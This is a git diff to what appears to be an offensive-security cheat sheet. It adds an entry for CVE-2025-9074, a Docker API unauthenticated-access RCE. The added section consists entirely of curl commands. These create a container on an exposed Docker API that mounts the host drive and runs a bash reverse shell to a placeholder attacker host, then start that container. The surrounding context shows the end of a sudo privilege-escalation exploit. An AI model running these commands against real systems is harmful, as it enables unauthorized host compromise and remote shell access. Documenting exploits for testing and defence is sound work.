@@ -45,6 +45,7 @@
 - [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authentication-bypass)
 - [CVE-2025-3155: Yelp File Read](#cve-2025-3155-yelp-file-read)
 - [CVE-2025-32463: chwoot sudo LPE](#cve-2025-32463-chwoot-sudo-lpe)
+- [CVE-2025-9074: Docker API Unauthorized Access RCE](#cve-2025-9074-docker-api-unauthorized-access-rce)
 - [BadSuccessor Delegated Managed Service Account (dMSA) LPE](#badsuccessor-delegated-managed-service-account-dmsa-lpe)
 - [GodPotato LPE](#godpotato-lpe)
 - [Juicy Potato LPE](#juicy-potato-lpe)
@@ -2225,6 +2226,31 @@ gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
 echo "woot!"
 sudo -R woot woot
 rm -rf ${STAGE?}
+```
+
+## CVE-2025-9074: Docker API Unauthenticated Access RCE
+
+```console
+$ curl -s -X POST http://192.168.65.7:2375/containers/create \
+  -H "Content-Type: application/json" \
+  -d '{
+        "Image":"docker_setup-nginx-php:latest",
+        "Cmd":["bash","-c","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"],
+        "HostConfig":{
+          "Binds":["/mnt/host/c:/host_root"]
+        }
+      }' \
+  -o create.json
+```
+
+```console
+$ cat create.json
+```
+
+```console
+$ curl -X POST \
+  -d '' \
+  http://192.168.65.7:2375/containers/fdd31f8cbabd91a9bcf0531768fd6b9bcebfcf5c2da2da459976ce1ee779cd11/start
 ```
 
 ## BadSuccessor Delegated Managed Service Account (dMSA) LPE
